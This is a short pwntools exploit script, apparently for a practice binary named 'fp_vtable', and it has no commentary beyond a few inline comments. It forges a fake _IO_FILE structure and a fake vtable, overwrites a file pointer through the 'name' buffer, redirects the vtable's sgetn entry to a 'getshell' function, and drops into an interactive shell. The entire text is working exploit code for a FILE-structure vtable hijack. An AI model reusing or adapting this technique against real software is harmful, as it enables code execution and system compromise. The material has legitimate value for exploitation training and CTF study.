#!/usr/bin/python                                                                     
from pwn import *

p = process("./fp_vtable")
elf = ELF("./fp_vtable")
name = elf.symbols['name']
getshell = elf.symbols['getshell']
fake_vtable = 0x6011b0

#fake _IO_FILE structure
pay = p64(0xfbad2488) + p64(0)*13
pay += p64(3) + p64(0)*2
pay += p64(name+0xe0)
pay += p64(0xffffffffffffffff)
pay += p64(0)*8
pay += p64(fake_vtable) #vtable
pay += '\x00'*(0x100-len(pay))
pay += p64(name) #fp

pay += p64(0)
# fake vtable 
pay += '\x00'*0x40
pay += p64(getshell) #sgetn mov rax, QWORD PTR [rax+0x40] jmp rax 

gdb.attach(p)
p.sendlineafter("Name: ", pay)


p.interactive()

